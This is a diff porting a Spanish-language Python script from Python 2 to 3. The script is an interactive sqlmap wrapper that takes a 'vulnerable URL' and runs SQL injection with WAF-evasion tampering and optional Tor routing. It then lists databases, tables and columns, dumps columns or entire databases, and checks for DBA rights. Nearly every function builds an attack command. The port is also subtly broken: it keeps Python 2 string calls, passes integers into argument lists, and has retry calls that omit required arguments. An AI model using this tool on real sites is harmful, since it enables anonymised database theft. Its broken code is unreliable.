@@ -12,13 +12,13 @@
 #
 #    You should have received a copy of the GNU General Public License
 #    along with this program.  If not, see <http://www.gnu.org/licenses/>.
-import subprocess
-import checker
+from subprocess import call
+from modules import checker
 
 def rsk():
     try:
         global risk
-        risk=int(raw_input("Introduce tu valor para --risk (1-3): "))
+        risk=int(input("Introduce tu valor para --risk (1-3): "))
         if risk < 1 or risk > 3:
             checker.cRojo("El valor solo puede ser de 1 a 3.\n")
             rsk()
@@ -29,12 +29,12 @@ def rsk():
         checker.cRojo("Por favor, el valor solo puede ser numerico.\n")
         rsk()
     except KeyboardInterrupt:
-        print "Saliendo."
+        print ("Saliendo.")
 
 def lev():
     try:
         global level
-        level=int(raw_input("Introduce tu valor para --level (1-5): "))
+        level=int(input("Introduce tu valor para --level (1-5): "))
         if level < 1 or level > 5:
             checker.cRojo("El valor solo puede ser de 1 a 5.\n")
             lev()
@@ -45,14 +45,14 @@ def lev():
         checker.cRojo("Por favor, el valor solo puede ser numerico.\n")
         lev()
     except KeyboardInterrupt:
-        print "Saliendo.\n"
+        print ("Saliendo.\n")
       
 def urlglob():
     try:
         global url
-        url=raw_input("introduce la url vulnerable: ")
+        url=input("introduce la url vulnerable: ")
         url=url.translate(None, "%+'")
-        if url != "" and "?" in url and "." in url:
+        if url and "?" in url and "." in url:
             return url
         elif url == "":
             checker.cRojo("La URL está vacia, intentelo de nuevo.\n")
@@ -64,14 +64,14 @@ def urlglob():
             checker.cRojo("Tu URL es invalida, por favor intentalo de nuevo.\n")
             urlglob()
     except KeyboardInterrupt:
-        print "Saliendo.\n"
+        print( "Saliendo.\n")
 
 def postglob():
     try:
         global post
-        post=raw_input("Introduce los datos post para la inyeccion: ")
+        post=input("Introduce los datos post para la inyeccion: ")
         post=post.translate(None, "%+'") 
-        if post != "":
+        if post:
             return post
         elif post == "":
             checker.cRojo("Los datos de POST inyeccion están vacios, intentelo de nuevo.\n")
@@ -80,31 +80,31 @@ def postglob():
             checker.cRojo("Los datos post son invalidos, intentalo de nuevo.\n")
             postglob()
     except KeyboardInterrupt:
-        print "Saliendo.\n"
+        print ("Saliendo.\n")
 
 def sqlinorm():
     urlglob()
     lev()
     rsk()
-    subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
+    call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
     postsqlin()
     
 def sqlitor():
     urlglob()
     lev()
     rsk()
-    subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
+    call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
     postsqlin()
 
 def sqlipost():
     global url
-    url=raw_input("introduce la url vulnerable: ")
+    url=input("introduce la url vulnerable: ")
     url=url.translate(None, "%+'")    
-    if url != "" and "." in url:
+    if url and "." in url:
         postglob()
         lev()
         rsk()
-        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dbs"])
+        call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dbs"])
         postsqlip()
     else:
         checker.cRojo("La URL esta vacia, intentalo de nuevo.\n")
@@ -112,45 +112,45 @@ def sqlipost():
 
 def sqlipostor():
     global url
-    url=raw_input("introduce la url vulnerable: ")
+    url=input("introduce la url vulnerable: ")
     url=url.translate(None, "%+'")    
-    if url != "" and "." in url:
+    if url and "." in url:
         postglob()
         lev()
         rsk()
-        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dbs"])
+        call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dbs"])
         postsqlip()
     else:
         checker.cRojo("La URL esta vacia, intentalo de nuevo.\n")
         sqlipostor()
 
 def postdb(mode):
-    db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
-    if db != "" and mode == "normalsqli":
-        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"--tables"])
-    elif db != "" and mode == "postsqli":
-        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"-D",db,"--tables"])
+    db=input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
+    if db and mode == "normalsqli":
+        call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"--tables"])
+    elif db and mode == "postsqli":
+        call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"-D",db,"--tables"])
     else:
         postdb()
 
 def posttables(mode):
-    db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
-    table=raw_input("Introduce el nombre de la tabla que quieres extraer la columnas: ")
-    if db != "" and table != "" and mode == "normalsqli":
-        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"-T",table,"--columns"])
-    elif db != "" and table != "" and mode == "postsqli":
-        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"-D",db,"-T",table,"--columns"])
+    db=input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
+    table=input("Introduce el nombre de la tabla que quieres extraer la columnas: ")
+    if db and table and mode == "normalsqli":
+        call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"-T",table,"--columns"])
+    elif db and table and mode == "postsqli":
+        call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"-D",db,"-T",table,"--columns"])
     else:
         posttables()
 
 def postcolumns(mode):
-    db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
-    table=raw_input("Introduce el nombre de la tabla que quieres extraer la columnas: ")
-    columns=raw_input("Introduce el nombre de la columna que quieres extraer los datos, o columnas separadas por coma si son varias: ")
-    if db != "" and table != "" and columns != "" and mode == "normalsqli":
-        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"-T",table,"-C",columns,"--dump"])
-    elif db != "" and table != "" and columns != "" and mode == "postsqli":
-        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"-D",db,"-T",table,"-C",columns,"--dump"])
+    db=input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
+    table=input("Introduce el nombre de la tabla que quieres extraer la columnas: ")
+    columns=input("Introduce el nombre de la columna que quieres extraer los datos, o columnas separadas por coma si son varias: ")
+    if db and table and columns and mode == "normalsqli":
+        call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"-T",table,"-C",columns,"--dump"])
+    elif db and table and columns and mode == "postsqli":
+        call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"-D",db,"-T",table,"-C",columns,"--dump"])
     else:
         postcolumns()
 
@@ -158,9 +158,9 @@ def isdba(mode):
     if mode == "normalsqli":
         checker.cAmarillo("Comprobando si el usuario actual es root de MySQL ...")
         outp = open("modules/sqlopt/output.txt", "w")
-        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--batch","--is-dba"],stdout=outp)
+        call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--batch","--is-dba"],stdout=outp)
         if 'current user is DBA:    False' in open('modules/sqlopt/output.txt').read():
-            print "El usuario no es root."
+            print ("El usuario no es root.")
             outp.close()
 
         elif 'current user is DBA:    True' in open('modules/sqlopt/output.txt').read():
@@ -172,9 +172,9 @@ def isdba(mode):
     elif mode == "postsqli":
         checker.cAmarillo("Comprobando si el usuario actual es root de MySQL ...")
         outp = open("modules/sqlopt/output.txt", "w")
-        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--batch","--is-dba"],stdout=outp)
+        call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--batch","--is-dba"],stdout=outp)
         if 'current user is DBA:    False' in open('modules/sqlopt/output.txt').read():
-            print "El usuario no es root."
+            print ("El usuario no es root.")
             outp.close()
         elif 'current user is DBA:    True' in open('modules/sqlopt/output.txt').read():
             checker.cVerde("El usuario es root!, esto es fascinante!!.")
@@ -183,39 +183,38 @@ def isdba(mode):
             checker.cRojo("Resultado inesperado.")
             outp.close()
     else:
-        print "Modo de inyección desconocido."
+        print ("Modo de inyección desconocido.")
         pass
-
 
 
 def dumpall(mode):
     checker.cRojo("""Dumpeando toda la base de datos, esto puede tomar un largo tiempo...
     Continue solo en caso de que sepa lo que esta haciendo.
     """)
-    decide=raw_input("Deseas continuar? (y/n): ")
+    decide=input("Deseas continuar? (y/n): ")
     if decide == "y" and mode == "normalsqli":
-        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dump-all"])
+        call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dump-all"])
     elif decide == "y" and mode == "postsqli":
-        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dump-all"])
+        call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dump-all"])
     elif decide == "n":
-        print "Saliendo."
+        print ("Saliendo.")
     else:
         checker.cRojo("Opcion equivovada, por favor verifique.")
         dumpall()
 
 def postsqlin():
     checker.cAmarillo("\nElige lo que quieres hacer. (IMPORTANTE: Elige una de estas opciones en caso de que la inyección SQLi haya sido exitosa. Si no fue exitosa la inyección, seleccione la opción 'f' e intentelo de nuevo aumentando el --level y el --risk.):")
-    print """
+    print ("""
     a) Extraer todas las tablas de una base de datos.
     b) Extraer todas las columnas de una tabla.
     c) Extraer todo de una o mas columnas.
     d) Dumpear toda la DataBase.
     e) Comprobar si el usuario MySQL es root.
     f) Salir.
-    """
-    sel=raw_input("Teclea tu opcion: ")
+    """)
+    sel=input("Teclea tu opcion: ")
     if sel == "f":
-        print "Saliendo."
+        print ("Saliendo.")
     elif sel == "a":
         postdb("normalsqli")
         postsqlin()
@@ -236,17 +235,17 @@ def postsqlin():
 
 def postsqlip():
     checker.cAmarillo("\nElige lo que quieres hacer. (IMPORTANTE: Elige una de estas opciones en caso de que la inyección SQLi haya sido exitosa. Si no fue exitosa la inyección, seleccione la opción 'f' e intentelo de nuevo aumentando el --level y el --risk.):")
-    print """
+    print ("""
         a) Extraer todas las tablas de una base de datos.
         b) Extraer todas las columnas de una tabla.
         c) Extraer todo de una o mas columnas.
         d) Dumpear toda la DataBase.
         e) Comprobar si el usuario MySQL es root.
         f) Salir.
-        """
-    sel=raw_input("Teclea tu opcion: ")
+        """)
+    sel=input("Teclea tu opcion: ")
     if sel == "f":
-        print "Saliendo."
+        print ("Saliendo.")
     elif sel == "a":
         postdb("postsqli")
         postsqlip()
@@ -267,13 +266,13 @@ def postsqlip():
 
 def execute():
     checker.cAmarillo("Selecciona tu opcion:")
-    print """
+    print ("""
     a) Sqli usando sqlmap sin proxy.
     b) Sqli usando sqlmap con TOR.
     c) Sqli usando post inyeccion.
     d) Sqli usando post inyeccion con TOR.
-    """
-    selec=raw_input("Teclea tu opcion: ")
+    """)
+    selec=input("Teclea tu opcion: ")
     if selec == "a":
         sqlinorm()
     elif selec == "b":
@@ -284,4 +283,3 @@ def execute():
         sqlipostor()
     else:
         execute()
-    
